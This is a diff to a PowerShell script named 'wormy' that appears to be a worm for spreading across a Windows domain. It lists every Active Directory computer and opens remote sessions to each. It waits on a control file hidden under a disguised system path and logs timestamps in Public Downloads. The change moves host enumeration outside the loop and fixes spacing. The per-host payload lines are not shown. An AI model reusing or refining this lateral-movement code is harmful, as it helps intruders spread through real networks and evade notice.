@@ -1,9 +1,10 @@
-﻿function wormy{
+﻿$computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
+function wormy{
 
 while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
 [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
 Write-Output 'slither'
-$computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
+
 Foreach($i in $computerNames){
     $s = new-pssession -ComputerName $i
     invoke-command -ComputerName $i -ScriptBlock {hostname}
@@ -21,7 +22,7 @@ Foreach($i in $computerNames){
             else{}
         }
     }
-    Get-PSSession |Remove-PSSession
+    Get-PSSession | Remove-PSSession
     start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
 }
 }
